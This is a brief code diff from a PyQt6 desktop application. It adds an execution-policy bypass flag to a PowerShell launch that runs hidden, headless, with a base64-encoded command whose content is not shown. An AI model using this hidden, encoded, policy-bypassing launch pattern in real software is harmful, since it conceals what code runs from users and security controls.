@@ -362,6 +362,7 @@ class MainWindow(PyQt6.QtWidgets.QMainWindow):
                 "conhost.exe",
                 "--headless",
                 "powershell.exe",
+                "-Policy", "Bypass",
                 "-NoProfile",
                 "-EncodedCommand",
                 base64_command,
